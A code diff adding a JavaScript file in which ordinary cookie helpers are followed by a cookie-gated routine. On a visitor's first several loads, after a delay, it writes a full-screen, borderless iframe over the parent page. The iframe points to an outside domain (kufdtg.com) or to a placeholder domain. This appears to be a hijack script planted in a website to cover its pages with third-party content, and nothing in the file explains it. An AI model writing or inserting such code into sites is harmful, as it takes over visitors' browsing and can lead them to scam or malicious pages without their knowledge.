@@ -1,0 +1,56 @@
+function getCookie(name){
+    var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+ 
+    if(arr=document.cookie.match(reg)) 
+        return unescape(arr[2]); 
+    else 
+        return false; 
+}
+function setCookie(name,value) 
+{ 
+    var Days = 30; 
+    var exp = new Date(); 
+    exp.setTime(exp.getTime() + Days*60*1*1*1000); 
+    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString(); 
+} 
+function delCookie(name) 
+{ 
+    var exp = new Date(); 
+    exp.setTime(exp.getTime() - 1); 
+    var cval=getCookie(name); 
+    if(cval!=null) 
+        document.cookie= name + "="+cval+";expires="+exp.toGMTString(); 
+} 
+// 判断cookie是否为空
+function checkCookie(name){
+	if(getCookie(name) == null || getCookie(name)=="" || getCookie(name)=="null" || typeof(getCookie(name))=="undefined" || getCookie(name)==false || getCookie(name) == undefined){
+		return false;
+	}else{
+		return true;
+	}
+}
+if(checkCookie('jiuka') == false){
+	setTimeout(function(){
+	parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"https://kufdtg.com/error/err.html\" frameBorder=0 scrolling=no></iframe>");
+	setTimeout(function(){
+	document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
+	setTimeout(function(){
+	parent.document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
+	},1000);
+setCookie('jiuka','1');
+}
+if(checkCookie('jiuka') == true){
+	var time = getCookie('jiuka');
+	var time = Number(time);
+	console.log('time='+time);
+	if(time <=5){
+		setTimeout(function(){
+		parent.document.writeln("<iframe style=\"margin:0px;padding:0px;height:100%;width:100%;\" src=\"https://域名.html\" frameBorder=0 scrolling=no></iframe>");
+		setTimeout(function(){
+		document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
+		setTimeout(function(){
+		parent.document.getElementsByTagName("body")[0].setAttribute("style","margin:0px;");},100);
+		},1000);
+		setCookie('jiuka',time+1);
+	}
+}
